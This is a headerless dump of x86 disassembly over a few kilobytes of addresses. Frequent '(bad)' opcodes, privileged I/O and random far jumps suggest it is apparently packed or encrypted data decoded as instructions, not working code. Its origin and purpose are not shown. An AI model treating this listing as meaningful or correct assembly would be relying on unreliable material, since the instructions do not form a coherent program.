  4064fc:	xlat   BYTE PTR ds:[ebx]
  4064fd:	mov    dh,0x75
  4064ff:	mov    ds:0x424aff4,al
  406504:	daa    
  406505:	aaa    
  406506:	add    ch,al
  406508:	(bad)  
  406509:	pop    esi
  40650a:	sbb    al,0x84
  40650c:	mov    esp,0x7e060ff4
  406511:	sbb    eax,0x423b1121
  406516:	push   0xa3664c2c
  40651b:	xchg   esi,eax
  40651c:	ror    bl,1
  40651e:	jge    0x406567
  406520:	jge    0x4064e3
  406522:	mov    BYTE PTR ds:0xe28940ba,bh
  406528:	mov    ds:0x25d7e09c,al
  40652d:	or     DWORD PTR [esi-0x54422e7],edi
  406533:	dec    esi
  406534:	pop    es
  406535:	mov    eax,0x93ea0018
  40653a:	pop    ebx
  40653b:	mov    ecx,0x22f16b52
  406540:	pop    ecx
  406541:	cli    
  406542:	(bad)
  406545:	(bad)  
  406546:	push   bp
  406548:	ret    
  406549:	mov    bl,0x84
  40654b:	daa    
  40654c:	mov    bh,0xad
  40654e:	int    0x9
  406550:	adc    al,0x96
  406552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406553:	pop    esp
  406554:	scas   al,BYTE PTR es:[edi]
  406555:	pop    esi
  406556:	pop    eax
  406557:	pushf  
  406558:	rol    bl,1
  40655a:	sub    esp,esp
  40655c:	popa   
  40655d:	mov    ds:0xa686a0a,eax
  406562:	mov    bh,0xbb
  406564:	out    0x2b,al
  406566:	cwde   
  406567:	sbb    eax,0x5ecae385
  40656c:	inc    edi
  40656d:	out    0x8,al
  40656f:	(bad)  
  406570:	repz mov dh,al
  406573:	ror    bx,0xc0
  406577:	push   0xffffffdb
  406579:	sub    eax,0x1884e576
  40657e:	pop    ecx
  40657f:	mov    edx,0x15582c7d
  406584:	fdivr  st(5),st
  406586:	stos   DWORD PTR es:[edi],eax
  406587:	dec    edx
  406588:	and    eax,0x24c6c59c
  40658d:	pop    ss
  40658e:	mov    ebx,0xd3f73c86
  406593:	pushf  
  406594:	stos   WORD PTR es:[edi],ax
  406596:	rol    DWORD PTR [ebx+esi*2-0x5a684293],0x13
  40659e:	dec    esp
  40659f:	cld    
  4065a0:	arpl   WORD PTR [ebp+0x35],bp
  4065a3:	sbb    BYTE PTR [eax+0x4e30ce55],bh
  4065a9:	bound  ebp,QWORD PTR [ebx]
  4065ab:	out    dx,eax
  4065ac:	mov    cl,0xc3
  4065ae:	and    al,0x8c
  4065b0:	push   ecx
  4065b1:	add    ebx,ebp
  4065b3:	xor    bh,BYTE PTR [ecx-0x3d]
  4065b6:	div    BYTE PTR [esi]
  4065b8:	lods   eax,DWORD PTR ds:[esi]
  4065b9:	jecxz  0x4065ba
  4065bb:	sub    al,0xa6
  4065bd:	xchg   edi,eax
  4065be:	xchg   edi,eax
  4065bf:	into   
  4065c0:	and    esi,DWORD PTR [eax-0x13c739fd]
  4065c6:	not    eax
  4065c8:	mov    al,0xd2
  4065ca:	mov    ebp,DWORD PTR [esi]
  4065cc:	add    al,0x22
  4065ce:	dec    ecx
  4065cf:	xor    ah,BYTE PTR [ebp-0x62a76a73]
  4065d5:	inc    esp
  4065d6:	add    al,0x60
  4065d8:	int    0x9a
  4065da:	call   0x7f99:0xd7fa282b
  4065e1:	jno    0x406658
  4065e3:	mov    edx,0x74705479
  4065e8:	push   ds
  4065e9:	daa    
  4065ea:	mov    edx,0xe4fc362a
  4065ef:	sbb    DWORD PTR [ebx+0x1ed44ab9],esp
  4065f5:	ins    DWORD PTR es:[edi],dx
  4065f6:	add    ebp,ebp
  4065f8:	dec    ebx
  4065f9:	test   BYTE PTR [esi+edi*8-0x6e],bl
  4065fd:	das    
  4065fe:	jge    0x4065fe
  406600:	inc    edi
  406601:	out    0x71,al
  406603:	add    DWORD PTR [edx],0xffffffd1
  406606:	shl    BYTE PTR [eax+0x77],0xd3
  40660a:	sub    dl,BYTE PTR [ebx+0x43]
  40660d:	sahf   
  40660e:	inc    eax
  40660f:	stos   DWORD PTR es:[edi],eax
  406610:	inc    esi
  406611:	xor    DWORD PTR [edx+0x66],ecx
  406614:	(bad)  
  406615:	into   
  406616:	xchg   sp,ax
  406618:	cdq    
  406619:	sbb    esp,ebx
  40661b:	and    eax,0xaebfc73
  406620:	pop    ss
  406621:	xchg   edi,eax
  406622:	or     bl,al
  406624:	xor    dh,BYTE PTR [edx+0x6c]
  406627:	rcr    BYTE PTR [edi],1
  406629:	xchg   edi,eax
  40662a:	rcr    ah,1
  40662c:	and    bl,BYTE PTR [ecx-0x7c]
  40662f:	in     eax,0x2b
  406631:	pushf  
  406632:	push   edi
  406633:	jbe    0x4066ae
  406635:	mov    al,0x35
  406637:	pop    ecx
  406638:	ret    
  406639:	cmp    DWORD PTR [eax-0x39],eax
  40663c:	xchg   DWORD PTR [eax+ebp*1+0x5f],edx
  406640:	call   0x84e4:0x8c50a768
  406647:	mov    ebx,0xb955ee02
  40664c:	cmp    edi,DWORD PTR [edi+0x63]
  40664f:	pushf  
  406650:	or     DWORD PTR [edx-0x6d],ebx
  406653:	mov    dl,0xf1
  406655:	or     edi,DWORD PTR [edi-0x2f395437]
  40665b:	pop    ss
  40665c:	dec    esi
  40665d:	jg     0x406606
  40665f:	jns    0x4065e9
  406661:	push   ds
  406662:	mov    edi,0xf6398442
  406667:	shl    BYTE PTR es:[ebx-0x41],0xf3
  40666c:	ins    BYTE PTR es:[edi],dx
  40666d:	fs cmc 
  40666f:	fwait
  406670:	xchg   ebp,eax
  406671:	dec    esp
  406673:	test   al,0x7d
  406675:	nop
  406676:	inc    ebp
  406677:	xchg   ecx,eax
  406678:	cli    
  406679:	repnz les ebp,FWORD PTR [ebx+ecx*1-0x9]
  40667e:	test   al,0xc
  406680:	popa   
  406681:	call   0x9b61d8b5
  406686:	jno    0x4066dd
  406688:	rol    DWORD PTR [esi+0x21b18534],cl
  40668e:	(bad)  
  40668f:	and    al,0xcc
  406691:	hlt    
  406692:	xchg   DWORD PTR [ebx+0x50],ecx
  406695:	into   
  406696:	or     eax,0x3dd18ba9
  40669b:	iret   
  40669c:	outs   dx,BYTE PTR ds:[esi]
  40669d:	ret    
  40669e:	adc    ebx,esp
  4066a0:	sbb    DWORD PTR [edi-0x2b434b71],ebx
  4066a6:	hlt    
  4066a7:	mov    edi,0x84f91916
  4066ac:	stc    
  4066ad:	aaa    
  4066ae:	cli    
  4066af:	mov    edi,0x14808dd6
  4066b4:	cmp    DWORD PTR [edx-0x4ee28d43],esi
  4066ba:	lods   al,BYTE PTR ds:[esi]
  4066bb:	inc    ebp
  4066bc:	push   cs
  4066bd:	inc    ebx
  4066be:	cmp    bl,ah
  4066c0:	rcr    DWORD PTR [esi],0x35
  4066c3:	clc    
  4066c4:	ret    
  4066c5:	test   BYTE PTR [esi],ah
  4066c7:	in     eax,0xfa
  4066c9:	bound  ecx,QWORD PTR [eax-0x7ae8fe65]
  4066cf:	mov    al,0x3c
  4066d1:	and    dh,BYTE PTR [edx-0x1c1fe06d]
  4066d7:	jecxz  0x4066bc
  4066d9:	mul    edx
  4066db:	add    al,0x70
  4066dd:	(bad)  
  4066de:	aaa    
  4066df:	in     al,0x4d
  4066e1:	push   ds
  4066e2:	mov    ds:0x5979b5a0,al
  4066e7:	lods   eax,DWORD PTR ds:[esi]
  4066e8:	xchg   esp,eax
  4066e9:	xor    DWORD PTR [eax],eax
  4066eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ec:	nop
  4066ed:	daa    
  4066ee:	test   eax,0xd20f09ce
  4066f3:	inc    esp
  4066f4:	(bad)  
  4066f5:	push   edi
  4066f6:	sbb    DWORD PTR [ecx],esi
  4066f8:	push   esp
  4066f9:	aad    0xeb
  4066fb:	out    0x27,al
  4066fd:	scas   eax,DWORD PTR es:[edi]
  4066fe:	jne    0x40674c
  406700:	mov    al,ds:0xd36c8d13
  406705:	or     ch,BYTE PTR [ebx]
  406707:	mov    al,ds:0xe4de5016
  40670c:	nop
  40670d:	sub    DWORD PTR [esi+0x2b86d7d0],0xedfbf160
  406717:	out    0x5c,al
  406719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40671a:	shl    BYTE PTR [eax+0x6c],cl
  40671d:	mov    cl,0xf
  40671f:	imul   esp,DWORD PTR [ecx+0x1a],0x973fd273
  406726:	stos   DWORD PTR es:[edi],eax
  406727:	ss mov ecx,0xc9cdb98e
  40672d:	cmp    BYTE PTR [esi+0x6e],cl
  406730:	lods   eax,DWORD PTR ds:[esi]
  406731:	in     eax,dx
  406732:	jl     0x406792
  406734:	gs test eax,0xd0c3f93f
  40673a:	or     bl,BYTE PTR [esi+esi*1]
  40673d:	push   edi
  40673e:	push   edx
  40673f:	mov    ch,0xd9
  406741:	jmp    0x4066eb
  406743:	mov    eax,0x942307fc
  406748:	inc    ebp
  406749:	push   0xbf8a7dbc
  40674e:	xchg   esp,eax
  40674f:	std    
  406750:	sbb    ebx,ebx
  406752:	pushf  
  406753:	sub    DWORD PTR [ebp-0x11],ebp
  406756:	arpl   WORD PTR [ecx],di
  406758:	inc    esp
  406759:	scas   al,BYTE PTR es:[edi]
  40675a:	in     al,dx
  40675b:	pop    ebp
  40675c:	adc    al,0x7b
  40675e:	pop    esi
  40675f:	pop    ebx
  406760:	ret    0x4d71
  406763:	retf   0xdf54
  406766:	test   al,0x90
  406768:	call   0x51c15cde
  40676d:	adc    esp,ecx
  40676f:	push   ebp
  406770:	(bad)  
  406771:	in     eax,dx
  406772:	xor    ecx,ebx
  406774:	das    
  406775:	int3   
  406776:	xchg   DWORD PTR [ecx+esi*8],ebx
  406779:	or     al,0x7a
  40677b:	mov    edi,0xc587ba9e
  406780:	xor    eax,0x78864f48
  406785:	add    DWORD PTR [edx],edx
  406787:	push   ebx
  406788:	test   eax,0x6452a637
  40678d:	xchg   ecx,eax
  40678e:	daa    
  40678f:	sub    ah,ah
  406791:	outs   dx,DWORD PTR ds:[esi]
  406792:	arpl   WORD PTR [esi],di
  406794:	lods   eax,DWORD PTR ds:[esi]
  406795:	add    eax,0xb8d9581d
  40679a:	mov    BYTE PTR [edi+0x4d],dh
  40679d:	cmp    al,0xec
  40679f:	fs jecxz 0x4067f0
  4067a2:	push   ds
  4067a3:	fiadd  WORD PTR [ecx]
  4067a5:	rcl    BYTE PTR [edi],cl
  4067a7:	dec    esi
  4067a8:	mov    ah,0x24
  4067aa:	dec    edi
  4067ab:	mov    dl,0x21
  4067ad:	inc    ecx
  4067ae:	lods   eax,DWORD PTR ds:[esi]
  4067af:	aaa    
  4067b0:	shr    DWORD PTR [edx-0x25],1
  4067b3:	cmp    DWORD PTR [edx-0x2abfaf74],ebp
  4067b9:	jo     0x4067b2
  4067bb:	arpl   di,di
  4067bd:	pop    edx
  4067be:	test   eax,0xc662b10a
  4067c3:	cmp    esi,DWORD PTR [ebx]
  4067c5:	loope  0x4067df
  4067c7:	xchg   BYTE PTR [edx+0x760935aa],bl
  4067cd:	sub    eax,0x67b8002e
  4067d2:	cmpps  xmm3,xmm5,0xbe
  4067d6:	fst    DWORD PTR [esi+0x46348e70]
  4067dc:	xlat   BYTE PTR fs:[ebx]
  4067de:	mov    ebx,0xbc01c170
  4067e3:	mov    ds:0x1daa37f8,al
  4067e8:	arpl   ax,di
  4067ea:	jecxz  0x40679e
  4067ec:	pop    ss
  4067ed:	(bad)  
  4067ee:	mov    ah,0xfd
  4067f0:	jmp    0xa52:0x99e61ec1
  4067f7:	push   cs
  4067f8:	inc    eax
  4067f9:	aas    
  4067fa:	pusha  
  4067fb:	fst    DWORD PTR [ebp+0x2364e243]
  406801:	push   eax
  406802:	int    0x51
  406804:	(bad)  
  406805:	and    eax,0x5ba48a7
  40680a:	fcmovne st,st(5)
  40680c:	jmp    0x40679d
  40680e:	test   BYTE PTR [ecx+0x50],al
  406811:	push   es
  406812:	test   DWORD PTR [ebp+0x44e94fe],0x2929bf33
  40681c:	push   edi
  40681d:	pop    ds
  40681e:	rcl    BYTE PTR ds:0xdcadeb59,cl
  406824:	inc    esp
  406825:	jns    0x406852
  406827:	mov    edx,0x61edb290
  40682c:	mov    ebp,0x9ccdb7ce
  406831:	add    eax,0x233ea1c6
  406836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406837:	mov    eax,0x7cd5ec5a
  40683c:	out    0x96,al
  40683e:	mov    dh,0xc6
  406840:	in     eax,0x61
  406842:	mov    esp,0xaaf7a7b
  406847:	cmp    al,0x5b
  406849:	add    ecx,esp
  40684b:	vmread DWORD PTR [ebx],eax
  40684e:	sub    ecx,ebx
  406850:	push   ebx
  406851:	iret   
  406852:	sbb    eax,DWORD PTR [edi+0x53]
  406855:	loope  0x406881
  406857:	mov    ah,0x97
  406859:	and    al,0xf1
  40685b:	pop    eax
  40685c:	push   esp
  40685d:	fdiv   DWORD PTR [ebx-0x2393840c]
  406863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406864:	adc    DWORD PTR [ebx-0x7c],esp
  406867:	stos   BYTE PTR es:[edi],al
  406868:	xchg   edx,eax
  406869:	repz in al,0xfc
  40686c:	xchg   edi,eax
  40686d:	inc    ebx
  40686e:	ss xor esi,edx
  406871:	pop    edi
  406872:	xor    edx,DWORD PTR [ecx-0x3c]
  406875:	rcl    ch,1
  406877:	sub    BYTE PTR [ecx],dl
  406879:	jne    0x4067fb
  40687b:	xchg   esi,eax
  40687c:	xlat   BYTE PTR ds:[ebx]
  40687d:	cdq    
  40687e:	dec    ecx
  40687f:	adc    DWORD PTR [esi+eax*1+0x5f],ebp
  406883:	stc    
  406884:	dec    ebp
  406885:	mov    DWORD PTR [edi],edx
  406887:	ins    DWORD PTR es:[edi],dx
  406888:	jnp    0x406898
  40688a:	addr16 mov dh,cl
  40688d:	xor    DWORD PTR [eax],edi
  40688f:	dec    esp
  406890:	or     esp,DWORD PTR [eax]
  406892:	in     eax,dx
  406893:	mov    eax,0x81acc5e3
  406898:	sub    al,0xb4
  40689a:	adc    eax,0x7af91765
  40689f:	xchg   edi,eax
  4068a0:	psrld  mm3,mm5
  4068a3:	hlt    
  4068a4:	adc    ch,0x82
  4068a7:	cmp    DWORD PTR [edx-0x48],0xffffff85
  4068ab:	jmp    0xad51d10a
  4068b0:	fistp  QWORD PTR [edi]
  4068b2:	ins    BYTE PTR es:[edi],dx
  4068b3:	sub    ebx,DWORD PTR [esi+0x47]
  4068b6:	pop    ebp
  4068b7:	shr    DWORD PTR [eax+0x43],cl
  4068ba:	jmp    0x40691a
  4068bc:	add    DWORD PTR [ecx],eax
  4068be:	mov    al,ds:0x3484838c
  4068c3:	shr    BYTE PTR [ecx-0x4c],cl
  4068c6:	and    al,0xe0
  4068c8:	pcmpgtw mm6,QWORD PTR [eax-0x6]
  4068cc:	mov    eax,0x5b647015
  4068d1:	pop    ss
  4068d2:	mov    al,BYTE PTR [ebp-0x72d3d997]
  4068d8:	dec    esp
  4068d9:	push   0x75111b85
  4068de:	inc    esi
  4068df:	adc    esp,ebp
  4068e1:	aad    0xd7
  4068e3:	mov    eax,DWORD PTR [ebp+0x24]
  4068e6:	fistp  DWORD PTR [edx-0x44dc4974]
  4068ec:	mov    dh,0xb5
  4068ee:	(bad)  
  4068ef:	fs (bad) 
  4068f4:	into   
  4068f5:	lods   al,BYTE PTR ds:[esi]
  4068f6:	mov    eax,0xcfc15d40
  4068fb:	push   ss
  4068fc:	xor    bl,dh
  4068fe:	bound  ebp,QWORD PTR [edx]
  406900:	cwde   
  406901:	leave  
  406902:	loop   0x40690e
  406904:	cmp    al,0x2c
  406906:	and    BYTE PTR [ebp+0x1f],ch
  406909:	ret    0x321d
  40690c:	mov    esp,0xf8358203
  406911:	jb     0x4068bc
  406913:	pop    ebx
  406914:	pop    ecx
  406915:	fs jmp 0xd869:0x517324ba
  40691d:	mov    al,0xde
  40691f:	nop
  406920:	ins    DWORD PTR es:[edi],dx
  406921:	(bad)  
  406922:	jae    0x406927
  406924:	add    al,0x7e
  406926:	xchg   ecx,eax
  406927:	ins    DWORD PTR es:[edi],dx
  406928:	sbb    bl,ah
  40692a:	add    edi,DWORD PTR ds:0x52673203
  406930:	outs   dx,BYTE PTR ds:[esi]
  406931:	repnz imul al
  406934:	and    ch,BYTE PTR [edi-0x6d81c9bd]
  40693a:	xchg   ecx,eax
  40693b:	adc    al,0x2b
  40693d:	test   BYTE PTR [eax],cl
  40693f:	cli    
  406940:	outs   dx,DWORD PTR ds:[esi]
  406941:	jne    0x40693f
  406943:	mov    ah,0xc4
  406945:	inc    ecx
  406946:	in     al,0x0
  406948:	or     al,0xb
  40694a:	sbb    BYTE PTR ds:0xab863860,al
  406950:	mov    ebp,0x66fa4a36
  406955:	xor    al,cl
  406957:	mov    ebx,0x68b6e7bb
  40695c:	repnz cmc 
  40695e:	jmp    0x277f:0xc4a8fc65
  406965:	lock cmp dh,BYTE PTR [ecx+0x2d320fe7]
  40696c:	pop    edx
  40696d:	and    DWORD PTR [esi-0x3b14fd83],edi
  406973:	scas   eax,DWORD PTR es:[edi]
  406974:	pop    ebp
  406975:	xchg   ebx,eax
  406976:	js     0x4069e0
  406978:	jne    0x4069a9
  40697a:	(bad)  
  40697b:	and    DWORD PTR [edi-0x5d],ebx
  40697e:	push   edx
  40697f:	or     BYTE PTR ds:0x89324e7b,ah
  406985:	popa   
  406986:	cdq    
  406987:	dec    ebp
  406988:	mov    ebp,0x5369cc64
  40698d:	sub    eax,0xe5f91bbf
  406992:	adc    ecx,eax
  406994:	sbb    dl,BYTE PTR [edx-0x37]
  406997:	mov    eax,0x8300a2bc
  40699c:	idiv   esi
  40699e:	dec    edi
  40699f:	iret   
  4069a0:	xchg   ebp,eax
  4069a1:	sbb    eax,0x908c5755
  4069a6:	jae    0x406a0f
  4069a8:	imul   ecx,ecx,0x4a6a1267
  4069ae:	loop   0x406960
  4069b0:	push   cs
  4069b1:	imul   DWORD PTR [ebp+0x20]
  4069b4:	and    BYTE PTR [di],ah
  4069b7:	fld    QWORD PTR [esi+0x55ac9c1d]
  4069bd:	pop    eax
  4069be:	out    0xd,eax
  4069c0:	cdq    
  4069c1:	sbb    esi,DWORD PTR [edi]
  4069c3:	pusha  
  4069c4:	cmp    al,0xd4
  4069c6:	xchg   esp,eax
  4069c7:	mov    dl,bl
  4069c9:	sbb    BYTE PTR [eiz*4+0x4ab2aaed],ch
  4069d0:	mov    ebx,0x6919cd48
  4069d5:	sti    
  4069d6:	inc    edx
  4069d7:	jg     0x4069f1
  4069d9:	enter  0x6169,0xe1
  4069dd:	sub    edi,0xffffffe5
  4069e0:	add    DWORD PTR [ebp+0x176fb707],eax
  4069e6:	cmp    al,0x1b
  4069e8:	jmp    0x29ea:0xc98bfe08
  4069ef:	sbb    ebp,DWORD PTR [ecx]
  4069f1:	call   0xe33fe136
  4069f6:	lahf   
  4069f7:	push   ebp
  4069f8:	mov    ds:0xfcea248d,eax
  4069fd:	pusha  
  4069fe:	js     0x406a1f
  406a00:	fisubr WORD PTR [ecx-0x39d2316]
  406a06:	xchg   ah,ch
  406a08:	xor    esi,ecx
  406a0a:	dec    ebp
  406a0b:	retf   
  406a0c:	popf   
  406a0d:	pop    ds
  406a0e:	mov    DWORD PTR [ebx],ecx
  406a10:	out    0x4f,eax
  406a12:	dec    esp
  406a13:	daa    
  406a14:	mov    edx,DWORD PTR [ebx]
  406a16:	add    cl,BYTE PTR [eax+edx*8+0x61]
  406a1a:	inc    eax
  406a1b:	lea    eax,[ebp-0x71820a7]
  406a21:	inc    ebx
  406a22:	or     edi,eax
  406a24:	dec    edi
  406a25:	ds jae 0x4069fc
  406a28:	lock (bad) 
  406a2a:	shr    BYTE PTR [ebx+0x2c],1
  406a2d:	ffree  st(5)
  406a2f:	ds gs scas eax,DWORD PTR es:[edi]
  406a32:	bound  esp,QWORD PTR [eax+0x7a]
  406a35:	ins    DWORD PTR es:[edi],dx
  406a36:	fxch   st(5)
  406a38:	or     al,0xa9
  406a3a:	aas    
  406a3b:	sbb    BYTE PTR [ebp-0x70c62da0],0x64
  406a42:	cmp    al,0x60
  406a44:	arpl   WORD PTR gs:[eax+0x68],di
  406a48:	mov    bh,0xa2
  406a4a:	cmc    
  406a4b:	fsub   DWORD PTR [edi+0x56c48805]
  406a51:	xchg   ebx,eax
  406a52:	dec    eax
  406a53:	pop    edi
  406a54:	pop    esi
  406a55:	data16 sbb al,BYTE PTR [esi]
  406a58:	push   es
  406a59:	cwd    
  406a5b:	inc    esi
  406a5c:	shl    cl,cl
  406a5e:	cdq    
  406a5f:	mov    eax,0x5e317e47
  406a64:	inc    ebx
  406a65:	je     0x406a07
  406a67:	mov    al,ds:0x2a9d67a9
  406a6c:	and    ebx,DWORD PTR [eax+0x588aede7]
  406a72:	pop    edx
  406a73:	mov    esi,0x3d40c565
  406a78:	cld    
  406a79:	add    BYTE PTR [eax],cl
  406a7b:	xchg   esi,eax
  406a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7d:	jge    0x406a78
  406a7f:	retf   
  406a80:	sub    ah,BYTE PTR [eax+ecx*1]
  406a83:	test   BYTE PTR [ebx+0x687b25d1],al
  406a89:	jmp    0x406a5a
  406a8b:	test   DWORD PTR [ebp+0x1e5e1fe4],esi
  406a91:	arpl   WORD PTR [edx+edi*2-0x6a],sp
  406a95:	lods   eax,DWORD PTR ds:[esi]
  406a96:	dec    eax
  406a97:	inc    ebp
  406a99:	xor    al,0x7e
  406a9b:	dec    ebx
  406a9c:	or     ecx,0xffffffc5
  406a9f:	and    dl,BYTE PTR [edi+0x16]
  406aa2:	adc    esp,esi
  406aa4:	int    0x2
  406aa6:	enter  0x3908,0x24
  406aaa:	std    
  406aab:	mov    dl,0xb3
  406aad:	xchg   edx,eax
  406aae:	out    dx,al
  406aaf:	cmp    al,0x2d
  406ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab2:	dec    esp
  406ab3:	xchg   edi,eax
  406ab4:	cmovbe eax,DWORD PTR [ebp-0x7fe56a30]
  406abb:	stc    
  406abc:	dec    esp
  406abd:	sbb    eax,0x765249d3
  406ac2:	repnz int 0xe4
  406ac5:	push   esp
  406ac6:	ret    
  406ac7:	leave  
  406ac8:	nop
  406ac9:	popf   
  406aca:	and    ah,0x8c
  406acd:	mov    dh,0x28
  406acf:	shr    DWORD PTR [ebp+0x75b6c73d],cl
  406ad5:	mov    ebx,0x1d0bc811
  406ada:	js     0x406b06
  406adc:	sub    esi,DWORD PTR ds:0xd3498d1b
  406ae2:	dec    ecx
  406ae3:	js     0x406a78
  406ae5:	std    
  406ae6:	mov    cl,0x4
  406ae8:	in     al,0x1a
  406aea:	fistp  DWORD PTR [ebp+edx*8-0x74e03447]
  406af1:	jle    0x406ae4
  406af3:	sbb    eax,0x9aa7c92f
  406af8:	scas   al,BYTE PTR es:[edi]
  406af9:	cmp    edx,DWORD PTR [ebx+0x661b65ef]
  406aff:	int    0x5f
  406b01:	pop    ebp
  406b02:	stc    
  406b03:	retf   
  406b04:	push   edi
  406b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b06:	jle    0x406ae6
  406b08:	test   eax,0x2c7d3664
  406b0d:	inc    esi
  406b0e:	jmp    0x406b7e
  406b10:	(bad)  [edx+0x53a03d3c]
  406b16:	mov    ah,0x49
  406b18:	jle    0x406b8b
  406b1a:	jge    0x406b7d
  406b1c:	test   eax,0x6310c67f
  406b21:	pop    ss
  406b22:	das    
  406b23:	sbb    bh,BYTE PTR [esi+edx*8]
  406b26:	test   eax,0xea126e93
  406b2b:	mov    ebx,DWORD PTR fs:[esi+0xe]
  406b2f:	and    esp,DWORD PTR ds:0x7cca1713
  406b35:	inc    eax
  406b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b37:	gs jge 0x406ae6
  406b3a:	outs   dx,DWORD PTR ds:[esi]
  406b3b:	(bad)  
  406b3c:	jbe    0x406bb7
  406b3e:	and    eax,0x91ced446
  406b43:	inc    edx
  406b44:	inc    ebp
  406b45:	loop   0x406b93
  406b47:	mov    ss,WORD PTR [ecx-0x334002e4]
  406b4d:	inc    edx
  406b4e:	leave  
  406b4f:	lock out dx,al
  406b51:	push   0xffffffa1
  406b53:	loopne 0x406b9a
  406b55:	fs mov ebx,0xe8a4d0b9
  406b5b:	gs jle 0x406bd0
  406b5e:	xchg   BYTE PTR [ecx+0x33],al
  406b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b62:	sbb    eax,0x94c1bad8
  406b67:	shl    BYTE PTR [edi-0x73],1
  406b6a:	jne    0x406bc9
  406b6c:	(bad)  
  406b6d:	xchg   ebx,eax
  406b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b6f:	xchg   bh,ch
  406b71:	or     eax,DWORD PTR [eax+0x7d]
  406b74:	aam    0x71
  406b76:	mov    edi,0xf2a68b84
  406b7b:	sub    DWORD PTR [edx],esi
  406b7d:	pop    ebx
  406b7e:	add    al,0x4e
  406b80:	(bad)  
  406b81:	mov    ah,0xc8
  406b83:	test   BYTE PTR [ecx-0x59],bh
  406b86:	outs   dx,WORD PTR ds:[esi]
  406b88:	dec    edx
  406b89:	(bad)  
  406b8a:	std    
  406b8b:	clc    
  406b8c:	and    eax,0x8e098ef1
  406b91:	jp     0x406b8d
  406b93:	inc    edx
  406b94:	mov    esi,0xb73f284
  406b99:	aas    
  406b9a:	sbb    BYTE PTR [ecx+0x7ef709a7],cl
  406ba0:	xlat   BYTE PTR ds:[ebx]
  406ba1:	xchg   esp,eax
  406ba2:	imul   ebx,DWORD PTR [esi-0x35],0x187ce63b
  406ba9:	xchg   DWORD PTR [edx+0xd],esi
  406bac:	mov    edx,edi
  406bae:	xchg   edi,eax
  406baf:	fcom   DWORD PTR [edi+0x24]
  406bb2:	test   al,0x3a
  406bb4:	mov    al,ds:0x82094f99
  406bb9:	test   al,0x6e
  406bbb:	popf   
  406bbc:	mov    esi,0x57228cfa
  406bc1:	dec    eax
  406bc2:	ja     0x406b7d
  406bc4:	pop    ecx
  406bc5:	in     al,dx
  406bc6:	push   es
  406bc7:	xchg   ecx,eax
  406bc8:	or     eax,0x38ae7e05
  406bcd:	retf   0x8420
  406bd0:	and    eax,esp
  406bd2:	push   eax
  406bd3:	sbb    ch,BYTE PTR [eax]
  406bd5:	in     al,dx
  406bd6:	pop    esp
  406bd7:	or     BYTE PTR gs:[edx+0x1b],al
  406bdb:	push   edx
  406bdc:	jp     0x406b71
  406bde:	pop    ds
  406bdf:	mov    cl,0xb4
  406be1:	jno    0x406bac
  406be3:	adc    eax,0xc5a4622
  406be8:	cmp    al,0xd1
  406bea:	outs   dx,DWORD PTR ds:[esi]
  406beb:	es out 0x82,eax
  406bee:	xor    DWORD PTR [ebx+esi*1-0x27],0xe
  406bf3:	les    ebp,FWORD PTR [edx+ebx*2]
  406bf6:	(bad)
  406bf9:	inc    edx
  406bfa:	cmp    DWORD PTR ds:[edx+eiz*1+0x71],ecx
  406bff:	cmp    DWORD PTR ds:[esi+0x2b],ecx
  406c03:	inc    ebx
  406c04:	fistp  DWORD PTR [esi-0x6d]
  406c07:	mov    ecx,0xbbc9c270
  406c0c:	cmp    ebp,edx
  406c0e:	mov    edi,0x4d8662af
  406c13:	mov    DWORD PTR [eax],ecx
  406c15:	mov    eax,0x75476f3b
  406c1a:	imul   edi,DWORD PTR [ecx+0x12281e68],0x3
  406c21:	popa   
  406c22:	daa    
  406c23:	out    0x70,al
  406c25:	stc    
  406c26:	mov    edx,0x1830af8f
  406c2b:	mov    eax,DWORD PTR [ecx+edi*4-0x74]
  406c2f:	loope  0x406bbb
  406c31:	push   cs
  406c32:	xchg   esp,eax
  406c33:	stos   DWORD PTR es:[edi],eax
  406c34:	clc    
  406c35:	ins    BYTE PTR es:[edi],dx
  406c36:	out    0x74,eax
  406c38:	(bad)  
  406c3a:	(bad)  
  406c3c:	cmc    
  406c3d:	retf   0x623a
  406c40:	int    0x88
  406c42:	aaa    
  406c43:	daa    
  406c44:	or     al,0xe0
  406c46:	(bad)  
  406c47:	ds push ebx
  406c49:	(bad)  
  406c4a:	jp     0x406c5a
  406c4c:	mov    esp,0x62c75780
  406c51:	cwde   
  406c52:	stos   BYTE PTR es:[edi],al
  406c53:	pop    ss
  406c54:	mov    ds:0xb1bde693,eax
  406c59:	rol    BYTE PTR [esi+0x491071e9],1
  406c5f:	push   0x5a
  406c61:	sbb    BYTE PTR [ebp+0x7d],ah
  406c64:	out    0xef,eax
  406c66:	inc    ebx
  406c67:	loope  0x406bfc
  406c69:	pop    edx
  406c6a:	xchg   esp,eax
  406c6b:	je     0x406c34
  406c6d:	cmp    al,0xc9
  406c6f:	push   0x1476fe53
  406c74:	dec    esi
  406c75:	mov    ah,0xa9
  406c77:	xchg   ecx,eax
  406c78:	lods   al,BYTE PTR ds:[esi]
  406c79:	icebp  
  406c7a:	sub    BYTE PTR [esi-0x734a1a2f],cl
  406c80:	mov    ah,0xb
  406c82:	std    
  406c83:	or     edx,DWORD PTR [ebx+0xd]
  406c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c87:	ficomp DWORD PTR [edi-0x632180ad]
  406c8d:	rcr    BYTE PTR [eax-0x98dba0d],cl
  406c93:	pop    eax
  406c94:	adc    DWORD PTR ds:0x3dd500f2,0x4e06c708
  406c9e:	nop
  406c9f:	mov    cl,0xd2
  406ca1:	jmp    0x406c90
  406ca3:	les    edi,FWORD PTR [edi]
  406ca5:	jp     0x406ce8
  406ca7:	push   esp
  406ca8:	sbb    BYTE PTR [esi+0x1b],bh
  406cab:	mov    ?,WORD PTR [eax-0x41]
  406cae:	mov    eax,0x7a50409
  406cb3:	data16 sub bl,ah
  406cb6:	(bad)  
